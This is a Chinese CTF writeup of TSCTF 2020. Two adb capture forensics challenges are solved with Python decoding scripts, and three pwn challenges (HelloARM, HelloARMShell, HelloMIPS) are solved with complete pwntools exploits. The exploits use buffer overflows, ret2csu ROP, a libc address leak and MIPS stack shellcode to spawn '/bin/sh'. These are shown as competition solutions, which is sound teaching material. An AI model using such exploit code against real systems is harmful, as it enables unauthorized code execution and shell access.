---
title: 'TSCTF 2020 writeup（pwn + misc）'
date: 2020-10-19T15:48:21+08:00
id: 66
categories:
    - ctf
tags:
    - ctf
    - pwn
    - Android
---


部分题目的binary下载：[tsctf-bin.tar.gz](/objects/tsctf-bin.tar.gz)

## easy_adb

这题我们拿到的是一个`.pcapng`格式的文件，用wireshark可以直接打开，发现是wireshark抓取的一系列的TCP包，分析内容后可以发现这是通过TCP建立的adb shell连接。

点击`Analyze`->`Follow TCP Stream`就可以看到TCP流信息：

![image-20201019120452409](/images/blog/66/image-20201019120452409.png)

我们只关注字符串部分，所有的`raw:`后面的内容都是shell执行的指令。一开始执行了一些echo语句打印欢迎语。之后出现了`getevent -lp`、`getevent -p`、、`getevent -l`、`getevent -t`四条和输入事件有关 的指令。

通过分析得知，插入了一个`Yubico Yubikey NEO OTP+U2F+CCID`设备，它通过模拟一个键盘向Android输入信息，键和事件ID表如下：

```
add device 1: /dev/input/event4
  name:     "Yubico Yubikey NEO OTP+U2F+CCID"
  events:
    KEY (0001): KEY_ESC               KEY_1                 KEY_2                 KEY_3                
                KEY_4                 KEY_5                 KEY_6                 KEY_7                
                KEY_8                 KEY_9                 KEY_0                 KEY_MINUS            
                KEY_EQUAL             KEY_BACKSPACE         KEY_TAB               KEY_Q                
                KEY_W                 KEY_E                 KEY_R                 KEY_T                
                KEY_Y                 KEY_U                 KEY_I                 KEY_O                
                KEY_P                 KEY_LEFTBRACE         KEY_RIGHTBRACE        KEY_ENTER            
                KEY_LEFTCTRL          KEY_A                 KEY_S                 KEY_D                
                KEY_F                 KEY_G                 KEY_H                 KEY_J                
                KEY_K                 KEY_L                 KEY_SEMICOLON         KEY_APOSTROPHE       
                KEY_GRAVE             KEY_LEFTSHIFT         KEY_BACKSLASH         KEY_Z                
                KEY_X                 KEY_C                 KEY_V                 KEY_B                
                KEY_N                 KEY_M                 KEY_COMMA             KEY_DOT              
                KEY_SLASH             KEY_RIGHTSHIFT        KEY_KPASTERISK        KEY_LEFTALT          
                KEY_SPACE             KEY_CAPSLOCK          KEY_F1                KEY_F2               
                KEY_F3                KEY_F4                KEY_F5                KEY_F6               
                KEY_F7                KEY_F8                KEY_F9                KEY_F10              
                KEY_NUMLOCK           KEY_SCROLLLOCK        KEY_KP7               KEY_KP8              
                KEY_KP9               KEY_KPMINUS           KEY_KP4               KEY_KP5              
                KEY_KP6               KEY_KPPLUS            KEY_KP1               KEY_KP2              
                KEY_KP3               KEY_KP0               KEY_KPDOT             KEY_102ND            
                KEY_F11               KEY_F12               KEY_KPENTER           KEY_RIGHTCTRL        
                KEY_KPSLASH           KEY_SYSRQ             KEY_RIGHTALT          KEY_HOME             
                KEY_UP                KEY_PAGEUP            KEY_LEFT              KEY_RIGHT            
                KEY_END               KEY_DOWN              KEY_PAGEDOWN          KEY_INSERT           
                KEY_DELETE            KEY_PAUSE             KEY_LEFTMETA          KEY_RIGHTMETA        
                KEY_COMPOSE          
    MSC (0004): MSC_SCAN             
    LED (0011): LED_NUML              LED_CAPSL             LED_SCROLLL           LED_COMPOSE          
                LED_KANA             
  input props:
    <none>
```

```
add device 1: /dev/input/event4
  name:     "Yubico Yubikey NEO OTP+U2F+CCID"
  events:
    KEY (0001): 0001  0002  0003  0004  0005  0006  0007  0008 
                0009  000a  000b  000c  000d  000e  000f  0010 
                0011  0012  0013  0014  0015  0016  0017  0018 
                0019  001a  001b  001c  001d  001e  001f  0020 
                0021  0022  0023  0024  0025  0026  0027  0028 
                0029  002a  002b  002c  002d  002e  002f  0030 
                0031  0032  0033  0034  0035  0036  0037  0038 
                0039  003a  003b  003c  003d  003e  003f  0040 
                0041  0042  0043  0044  0045  0046  0047  0048 
                0049  004a  004b  004c  004d  004e  004f  0050 
                0051  0052  0053  0056  0057  0058  0060  0061 
                0062  0063  0064  0066  0067  0068  0069  006a 
                006b  006c  006d  006e  006f  0077  007d  007e 
                007f 
    MSC (0004): 0004 
    LED (0011): 0000  0001  0002  0003  0004 
  input props:
    <none>
```

最后`getevent -t`命令按照时间顺序给出了期间该设备的输入信息，经过简单的处理，我们从中剥离出所有的输出，大概类似于这样：

```
[  269463.944942] 0014 0000 00000000
[  269463.944942] 0014 0001 00000000
[  269463.944942] 0000 0000 00000000
[  269463.952956] 0004 0004 00070019
[  269463.952956] 0001 002f 00000001
[  269463.952956] 0000 0000 00000000
[  269463.960909] 0004 0004 00070019
[  269463.960909] 0001 002f 00000000
...
```

通过在实机上测试我们发现，第一列是时间，第二列是事件id，第三列是事件的值，第四列是额外的参数，我们从中晒出第二列为`0001`的行（表示KEY事件），然后筛出第四列为`00000001`的行（表示按钮抬起的事件），取出第三列的事件id：

```
['002f','002f','0023','0020','0013','0014','0020','0020','0030','0031','002f','002f','0014','0026','0017','0012','0024','0020','0030','0022','0016','0031','0013','0017','002e','0017','0020','0024','0017','0016','002f','0023','0012','0021','0013','0020','0014','0017','0020','0026','0017','0024','0030','0013','001c']
```

再把上面的两个表做一个映射表出来，写一个python脚本去匹配这些id就能得到输入内容：

```python
ids_str = ['KEY_ESC','KEY_1','KEY_2','KEY_3','KEY_4','KEY_5','KEY_6','KEY_7','KEY_8','KEY_9','KEY_0','KEY_MINUS','KEY_EQUAL','KEY_BACKSPACE','KEY_TAB','KEY_Q','KEY_W','KEY_E','KEY_R','KEY_T','KEY_Y','KEY_U','KEY_I','KEY_O','KEY_P','KEY_LEFTBRACE','KEY_RIGHTBRACE','KEY_ENTER','KEY_LEFTCTRL','KEY_A','KEY_S','KEY_D','KEY_F','KEY_G','KEY_H','KEY_J','KEY_K','KEY_L','KEY_SEMICOLON','KEY_APOSTROPHE','KEY_GRAVE','KEY_LEFTSHIFT','KEY_BACKSLASH','KEY_Z','KEY_X','KEY_C','KEY_V','KEY_B','KEY_N','KEY_M','KEY_COMMA','KEY_DOT','KEY_SLASH','KEY_RIGHTSHIFT','KEY_KPASTERISK','KEY_LEFTALT','KEY_SPACE','KEY_CAPSLOCK','KEY_F1','KEY_F2','KEY_F3','KEY_F4','KEY_F5','KEY_F6','KEY_F7','KEY_F8','KEY_F9','KEY_F10','KEY_NUMLOCK','KEY_SCROLLLOCK','KEY_KP7','KEY_KP8','KEY_KP9','KEY_KPMINUS','KEY_KP4','KEY_KP5','KEY_KP6','KEY_KPPLUS','KEY_KP1','KEY_KP2','KEY_KP3','KEY_KP0','KEY_KPDOT','KEY_102ND','KEY_F11','KEY_F12','KEY_KPENTER','KEY_RIGHTCTRL','KEY_KPSLASH','KEY_SYSRQ','KEY_RIGHTALT','KEY_HOME','KEY_UP','KEY_PAGEUP','KEY_LEFT','KEY_RIGHT','KEY_END','KEY_DOWN','KEY_PAGEDOWN','KEY_INSERT','KEY_DELETE','KEY_PAUSE','KEY_LEFTMETA','KEY_RIGHTMETA','KEY_COMPOSE']
ids = ['0001','0002','0003','0004','0005','0006','0007','0008','0009','000a','000b','000c','000d','000e','000f','0010','0011','0012','0013','0014','0015','0016','0017','0018','0019','001a','001b','001c','001d','001e','001f','0020','0021','0022','0023','0024','0025','0026','0027','0028','0029','002a','002b','002c','002d','002e','002f','0030','0031','0032','0033','0034','0035','0036','0037','0038','0039','003a','003b','003c','003d','003e','003f','0040','0041','0042','0043','0044','0045','0046','0047','0048','0049','004a','004b','004c','004d','004e','004f','0050','0051','0052','0053','0056','0057','0058','0060','0061','0062','0063','0064','0066','0067','0068','0069','006a','006b','006c','006d','006e','006f','0077','007d','007e','007f']

ids_map = dict(zip(ids, ids_str))

input_ids = ['002f','002f','0023','0020','0013','0014','0020','0020','0030','0031','002f','002f','0014','0026','0017','0012','0024','0020','0030','0022','0016','0031','0013','0017','002e','0017','0020','0024','0017','0016','002f','0023','0012','0021','0013','0020','0014','0017','0020','0026','0017','0024','0030','0013','001c']

result = [ids_map[x][4:].lower() for x in input_ids]

print(result)

# output:
# ['v', 'v', 'h', 'd', 'r', 't', 'd', 'd', 'b', 'n', 'v', 'v', 't', 'l', 'i', 'e', 'j', 'd', 'b', 'g', 'u', 'n', 'r', 'i', 'c', 'i', 'd', 'j', 'i', 'u', 'v', 'h', 'e', 'f', 'r', 'd', 't', 'i', 'd', 'l', 'i', 'j', 'b', 'r', 'enter']

```

这是yubikey的OTP一次性密码。

分析一开始的欢迎语，其中有一条：

```
echo Your flag will be tsctf{*data*}
```

最后只要把输入内容套上`tsctf{` `}`就可以交了


## super_easy_adb

这题我们拿到的依然是一个`.pcapng`格式的文件，老套路用wireshark可以直接打开，发现这次抓取的是USB协议的包，分析协议发现依然是adb shell。

这次没有像TCP包那样的选项让我们可以导出包的内容，不过我们可以直接用vscode打开这个二进制文件，直接看其中的字符串：

用`strings`命令可以提取出文件中的字符串内容：

```sh
strings -s '' -w ./super_easy_adb.pcapng
```

![image-20201019124706584](/images/blog/66/image-20201019124706584.png)



首先看`raw:`后面的内容，依然是`getevent -lp`、`getevent -p`、、`getevent -l`、`getevent -t`，但是这次的输入设备变成了`sec_touchscreen`，应该是一个触屏设备。

老规矩把映射表捞出来：

```
add device 2: /dev/input/event2
  name:     "sec_touchscreen"
  events:    KEY (0001): KEY_HOMEPAGE         OKAYyWRTE BTN_TOOL_FINGER       BTN_TOUCH             01c7                     
             ABS (0003): ABS_X                 : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                ABS_Y                 : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                ABS_PRESSURE          : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                ABS_MT_SLOT           : value 0, min 0, max 9, fuzz 0, flat 0, resolution 0
                ABS_MT_TOUCH_MAJOR    : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                ABS_MT_TOUCH_MINOR    : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                ABS_MT_POSITION_X     : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                ABS_MT_POSITION_Y     : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                ABS_MT_TRACKING_ID    : value 0, min 0, max 65535, fuzz 0, flat 0, resolution 0
                ABS_MT_PRESSURE       : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                003e                  : value 126, min 0, max 65535, fuzz 0, flat 0, resolution 0
             SW  (0005): SW_PEN_INSERTED        input props:    INPUT_PROP_DIRECT
```

```
add device 2: /dev/input/event2
  name:     "sec_touchscreen"
  events:
    KEY (0001): 00ac  0145  014a  01c7 
    ABS (0003): 0000  : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                0001  : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                0018  : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                002f  : value 0, min 0, max 9, fuzz 0, flat 0, resolution 0
                0030  : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                0031  : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                0035  : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                0036  : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                0039  : value 0, min 0, max 65535, fuzz 0, flat 0, resolution 0
                003a  : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                003e  : value 126, min 0, max 65535, fuzz 0, flat 0, resolution 0
    SW  (0005): 000f 
  input props:
    INPUT_PROP_DIRECT
```

这次我们只看`ABS (0003):`里的`ABS_MT_POSITION_X`和`ABS_MT_POSITION_Y`

比如下面这两条输出：第二列为`ABS (0003):`，第三列分别为`ABS_MT_POSITION_X`和`ABS_MT_POSITION_Y`，第三列的值则是屏幕像素点坐标。

```
[  270524.032103] 0003 0035 00000487
[  270524.032103] 0003 0036 000007b9
```

老规矩，写一个python脚本来解决这件事情

```python
import matplotlib.pyplot as plt

# input_strs太长了， 这里只放一部分
input_strs = '''[  270488.473135] 0003 0039 0000e822
[  270488.473135] 0001 014a 00000001
[  270488.473135] 0001 0145 00000001
[  270488.473135] 0003 0035 00000076
[  270488.473135] 0003 0036 0000025b
[  270488.473135] 0003 0030 0000000b
[  270488.473135] 0003 0031 0000000b
[  270488.473135] 0003 003a 00000007
[  270488.473135] 0000 0000 00000000
[  270488.497634] 0003 0030 0000000a
[  270488.497634] 0003 0031 0000000a
[  270488.497634] 0003 003a 00000006
[  270488.497634] 0000 0000 00000000
'''

cur_x = 0
cur_y = 0

xs = []
ys = []

for line in input_strs.split('\n'):
    if line[18:22] == '0003':
        if line[23:27] == '0035':
            cur_x = int(line[28:36], 16)
        if line[23:27] == '0036':
            cur_y = -int(line[28:36], 16) # 翻转
            xs.append(cur_x)
            ys.append(cur_y)

plt.scatter(xs, ys, alpha=0.6)
plt.show()
```

需要注意的是，与数学中的二位坐标不同，Android屏幕的坐标原点在屏幕左上角，因此y轴的方向是向下的，我们用一个负号来翻转图像。

![image-20201019130558172](/images/blog/66/image-20201019130558172.png)

屏幕手势的内容就是flag啦


## HelloARM

这题是一道arm的pwn题，思路是ROP，给的程序包含三个文件：

```
Archive:  HelloARM-d16411d0de1ce65a122d8f567ff53897.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-10-05 17:31   lib/
  1345176  2020-10-05 17:30   lib/libc-2.27.so
   125896  2020-10-05 17:31   lib/ld-linux-aarch64.so.1
     9760  2020-10-04 22:14   HelloARM
---------                     -------
  1480832                     4 files
```

首先checksec看一下：

![image-20201019142904415](/images/blog/66/image-20201019142904415.png)

是aarch64小端的程序，可以发现开启了NX，意味着我们不能在栈上执行代码，没开PIE意味着地址不是随机的。

先用qemu跑一下程序：

```
qemu-aarch64 -L ./ ./HelloARM
```

![image-20201019132755929](/images/blog/66/image-20201019132755929.png)

总的来说程序先给出一个Magic number，然后会有两轮输入输出的交互。

接下来用ida分析，main函数先去执行init函数，其中会打开当前目录下的一个`./flag`文件，并把文件描述符存到全局变量`fd`里面，main函数内部在栈上开辟了一个缓冲区，Magic number就是这个缓冲区的栈地址，随后会读入大小为0x10的内容到bss段的`name`数组中，随后打印这串内容，最后进入`oooooo()`函数，函数内部开辟了0x100大小的栈上数组用来存用户输入的message，但这里存在溢出漏洞。

首先我们需要知道的是，aarch64用X30这个寄存器来存储函数调用的返回地址，并在进入子函数后将X30中的返回地址压入栈中。比较特别的是`oooooo()`函数中，栈上数组的地址比存放X30内容的地址高，因此无法劫持`oooooo()`的`ret`指令，但是我们还可以劫持`main()`的`ret`指令。

找到切入点后，我们尝试寻找可用的`gadget`，寻找一番没有找到合适的。但是该程序中包含一个`__libc_csu_init()`函数，利用该函数中的特殊结构，我们可以指定参数并完成任意函数的调用。

![image-20201019134343835](/images/blog/66/image-20201019134343835.png)

最后这题的思路主要是：

- 用`oooooo()`的缓冲区溢出劫持`main()`的`ret`指令，让它跳转到`__libc_csu_init()`函数内部`.text:0000000000400AD0`地址处（上图）。
- 然后我们通过精心构造溢出部分的内容，让程序去调用.plt表中的`read()`函数，读出`./flag`文件的内容（这里我们猜测服务器上fd的值是3，本地测试qemu上运行时fd是5），放到`main()`函数栈上的缓冲区中（即magic number给出的地址）。
- 然后再一次利用`__libc_csu_init()`函数，调用一个`write()`函数，将magic number处的内容写到标准输入里。


```python
from pwn import *
import sys
context.log_level='debug'
context.arch='aarch64'
Debug = True

elf=ELF('./HelloARM', checksec = False)

libc=ELF("./lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    return remote('10.104.255.210', 7777)
    # global libc
    # if args['REMOTE']:
    #     if other_libc is not null:
    #         libc = ELF("./", checksec = False)
    #     return remote('10.104.255.210', 7777)
    # elif Debug:
    #     sh = process(["qemu-aarch64", "-g", "2333", "-L", "./", "./HelloARM"])
    #     log.info('Please use GDB remote!(Enter to continue)')
    #     raw_input()
    #     return sh
    # else :
    #     return process(["qemu-aarch64", "-L", "./", "./HelloARM"])


conn = get_sh()
conn.recvline()
bb = conn.recvline()
hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)

guess_fd = 3
flag_len = 0x20*8 - 8

conn.recv()
conn.send('imlk____________')
conn.recv()
payload = ('a' * 0x100).encode() # 填充

payload += p64(addr_magic - 0x10) # x29
payload += p64(0x0000000000400AD0) # x30 for ret to __libc
for i in range(0, 0x32):
    if i == 0x0: 
        payload += p64(0x0000000000400730) # set to write func pointer
    elif i == 0x1: # addr_magic-0x08 for w
        payload += p64(0x0000000000400760) # set to read func pointer
    elif i == 0x2: # addr_magic
        payload += p64(0) # addr_magic-0x28 for x19


    elif i == 0x22:# x29
        payload += p64(addr_magic - 0x10)
    elif i == 0x23:# x30
        payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
    elif i == 0x25: # x20
        payload += p64(1) # to compare with x19, mark read() finished
    elif i == 0x26: # x21
        payload += p64(addr_magic - 0x8)
    elif i == 0x27: # x22
        payload += p64(guess_fd)
    elif i == 0x28: # x23
        payload += p64(addr_magic + 0x8)
    elif i == 0x29: # x24
        payload += p64(flag_len)


    elif i == 0x2a: # x29
        payload += p64(addr_magic - 0x10)
    elif i == 0x2b: # x30
        payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
    elif i == 0x2d: # x20
        payload += p64(1) # to compare with x19, mark write() finished
    elif i == 0x2e: # x21
        payload += p64(addr_magic - 0x10)
    elif i == 0x2f: # x22
        payload += p64(1)
    elif i == 0x30: # x23
        payload += p64(addr_magic + 0x8)
    elif i == 0x31: # x24
        payload += p64(flag_len)
    else:
        payload += p64(i)

conn.send(payload)

while True:
    conn.recv()

```

看到flag了：

![image-20201019135329078](/images/blog/66/image-20201019135329078.png)

需要注意的是初始化时用`alarm()`函数，设定了一个定时器，会在1分钟内结束程序，在gdb调试过程中回很难受。可以用ida给程序打patch，把对`alarm()`的调用换成`nop`


## HelloARMShell

这次我们需要在上一次的基础上get shell，即执行`system("/bin/sh")`。

首先我们需要准备参数`"/bin.sh"`和`system()`函数的地址，我们可以把`"/bin.sh"`放到第一次输入的`name`字段，因为`name`的地址是静态的，会方便很多。

至于`system()`函数的地址，这个程序并没有连接到`system()`函数，所以无法在plt表中找到对应的项，但是我们可以先获取到`.got`表中` write()`函数的 地址，然后通过偏移量算出`system()`函数的地址。

偏移量的计算可以在本机通过解析`libc.so`文件来解决。



最后，这题的思路主要是：

- 用`oooooo()`的缓冲区溢出劫持`main()`的`ret`指令，让它跳转到`__libc_csu_init()`函数内部`.text:0000000000400AD0`地址处（上图）。

- 然后我们通过精心构造溢出部分的内容，让程序去调用.plt表中的`write()`函数，往标准输出中写出`.got`表中`write()`函数对应位置的，8个字节的内容，这就是运行时`libc.so`中`write()`函数的地址。
- 本机的py脚本读取到地址后，加上偏移量计算出`system()`函数的地址，发送给程序。
- 对应的，我们再一次利用`__libc_csu_init()`函数，调用一个`read()`函数，读入算好的`system()`函数地址。
- 最后我们利用`__libc_csu_init()`函数，调用`system()`函数，成功get shell



```python
from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'aarch64'
Debug = True

elf = ELF('./HelloARM', checksec=False)
libc = ELF("./lib/libc.so.6", checksec=False)

offset = libc.functions['system'].address - libc.functions['write'].address
write_addr = elf.got["write"]


def get_sh(other_libc=null):
    return remote('10.104.255.210', 7777)
    # global libc
    # if args['REMOTE']:
    #     if other_libc is not null:
    #         libc = ELF("./", checksec = False)
    #     return remote('10.104.255.210', 7777)
    # elif Debug:
    #     sh = process(["qemu-aarch64", "-g", "2333", "-L", "./", "./HelloARM"])
    #     log.info('Please use GDB remote!(Enter to continue)')
    #     raw_input()
    #     return sh
    # else :
    #     return process(["qemu-aarch64", "-L", "./", "./HelloARM"])


conn = get_sh()
conn.recvline()
bb = conn.recvline()
hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)

guess_fd = 3
flag_len = 0x20*8 - 8

conn.recv()
conn.send('/bin/sh\0_______')
conn.recvuntil('Set your message:')
payload = ('\0' * 0x100).encode()  # 填充

payload += p64(addr_magic - 0x10)  # x29
payload += p64(0x0000000000400AD0)  # x30 for ret to __libc

# addr_magic-0x10 for w
payload += p64(0x0000000000400730)  # set to write func pointer
# addr_magic-0x08 for r
payload += p64(0x0000000000400760)  # set to read func pointer
# addr_magic

payload += p64(0)  # addr_magic for x19
payload += p64(0)  # addr_magic + 0x8 for system() address
# addr_magic + 0x10 for arg 0
a1 = '/bin/sh\0'.encode()
payload += a1
payload += b'\0' * ((0x20-2)*8 - len(a1))

# x29
payload += p64(addr_magic - 0x10)
# x30
payload += p64(0x0000000000400AB0)  # for ret to __libc stage 2
# padding
payload += p64(0)
# x20
payload += p64(1)  # to compare with x19, mark write() finished
# x21
payload += p64(addr_magic - 0x10)
# x22
payload += p64(1)
# x23
payload += p64(0x0000000000411038)
# x24
payload += p64(8)


# x29
payload += p64(addr_magic - 0x10)
# x30
payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
# padding
payload += p64(0)
# x20
payload += p64(1) # to compare with x19, mark read() finished
# x21
payload += p64(addr_magic - 0x8)
# x22
payload += p64(0)
# x23
payload += p64(addr_magic + 0x8)
# x24
payload += p64(8)


# x29
payload += p64(addr_magic - 0x10)
# x30
payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
# padding
payload += p64(0)
# x20
payload += p64(1) # to compare with x19, mark read() finished
# x21
payload += p64(addr_magic + 0x8)
# x22
payload += p64(0x0000000000411080)
# x23
payload += p64(0)
# x24
payload += p64(0)


conn.send(payload)
conn.recv()
addr_libc_write = conn.recv(numb=8)

print("addr_libc_write: {}".format(addr_libc_write[::-1].hex()))
addr_libc_system = p64(
    offset + int.from_bytes(addr_libc_write, byteorder='little'))
print("addr_libc_system: {}".format(addr_libc_system[::-1].hex()))

conn.send(addr_libc_system)

conn.interactive()
```

执行后成功getshell：

![image-20201019142513403](/images/blog/66/image-20201019142513403.png)


## HelloMIPS

这题和arm的那题比较相似，也是ROP，但是比arm的简单一些，给的程序包含三个文件：



```
Archive:  ./HelloMIPS-833e170bbe2429fe66aae530c279c67b.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     7260  2020-10-03 14:52   HelloMIPS
        0  2020-10-04 22:27   lib/
   552634  2009-04-05 18:09   lib/libuClibc-0.9.30.1.so
    28971  2009-04-05 18:09   lib/ld-uClibc-0.9.30.1.so
---------                     -------
   588865                     4 files
```

checksec看一下：

![image-20201019142817343](/images/blog/66/image-20201019142817343.png)

是mipsel小端的程序，没有开任何的选项，那么这题很可能要在栈上执行代码了。

先用qemu跑一下程序：

```
qemu-mipsel -L ./ ./HelloMIPS
```

![image-20201019143112985](/images/blog/66/image-20201019143112985.png)

总的来说程序先要求一份输入，然后给出一个Magic number，之后会有一次输入，但是没有任何回显。

启动ida来分析这个程序：

程序和HelloARM的比较相似，但是main函数中没有buff，第一次读取的`0xF`个字节的内容被写入到bss段的`NAME`数组中。之后调用的`oooooo()`函数也存在缓冲区溢出，但是与ARM的汇编不同的是，存放返回地址的位置在缓冲区的上方，这使得我们可以直接劫持`oooooo()`的返回指令。

首先我们需要mipsel的函数调用规则，这里有一篇比较好的文章：https://blog.csdn.net/gujing001/article/details/8476685

简单来说，mipsel的函数调用，返回地址存放在`$ra`寄存器中。另外mipsel每次调用库函数时，会先从`.got`表中对应的项中取出目标函数地址，放入`$t9`寄存器然后用`jalr $9`跳入该目标函数。如果是第一次调用该函数，`.got`表中指向的会是该函数在`.plt`表中的对应代码，加载完成后会修改`.got`表项。



最后思路如下：

- 先劫持`oooooo()`的返回地址，跳转到bss段上，bss的地址是静态的，因此可以实现 。因此，我们要在第一次输入时，往bss上放置跳板代码。
- bss上的代码主要是读取栈指针`$sp`并跳转到栈上的地址执行代码
- 第二次输入时，需要在栈上填充代码，调用`system()`函数（它的地址就是给出的magic number的值），`/bin/sh`字符串可以放在栈上，但是要放在`$sp`指针的后面，否则在调用`system()`函数时会覆盖掉。

![image-20201019144642666](/images/blog/66/image-20201019144642666.png)



完整代码如下：

```python
from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'mips'
Debug = True

elf = ELF('./HelloMIPS', checksec=False)


def get_sh(other_libc=null):
    # return process(["qemu-mipsel", "-L", "./", "./HelloMIPS"])
    return remote('10.104.255.211', 7777)
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec=False)
        return remote('10.104.255.211', 7777)
    elif Debug:
        sh = process(["qemu-mipsel", "-g", "2333", "-L", "./", "./HelloMIPS"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else:
        return process(["qemu-mipsel", "-L", "./", "./HelloMIPS"])


conn = get_sh()
conn.recvline()

payload = b''
payload += asm('addi $t9, $sp, -0x108')
payload += asm('nop')
payload += asm('jalr $t9')
payload += b'\0' * (0xF-len(payload))


conn.send(payload)
conn.recvline()

bb = conn.recvline()

hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)
print('hex_magic: {}'.format(hex_magic))

addr_NAME = 0x440E20
payload = b''
payload += asm('move $a0, $sp')
payload += asm('li $t9, ' + hex(addr_magic))
payload += asm('nop')
payload += asm('jalr $t9')
payload += asm('nop')

payload += b'a' * (0x100 - len(payload))
payload += p32(0xdeadbeef)
payload += p32(addr_NAME)
# 重要參數放到sp后面防止被冲掉！！！！！
payload += b'/bin/sh\0'

conn.send(payload)

conn.interactive()

# TSCTF{d561c9d2-064d-11eb-80ab-0242ac110002}
```


![image-20201019150313905](/images/blog/66/image-20201019150313905.png)



